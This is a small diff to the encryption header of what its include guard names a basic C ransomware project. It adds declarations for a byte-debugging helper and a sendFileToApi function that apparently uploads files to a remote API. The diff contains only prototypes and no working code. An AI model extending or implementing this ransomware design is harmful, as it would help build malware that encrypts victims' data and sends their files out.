@@ -29,6 +29,7 @@ int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *aad,
 int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad,
             int aad_len, unsigned char *tag, unsigned char *key, unsigned char *iv,
             unsigned char *plaintext);
-
+char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
+void sendFileToApi(const char *path, const char *id, const char *api);
 
 #endif //BASIC_C_RANSOMWARE_ENCRYPTION_H
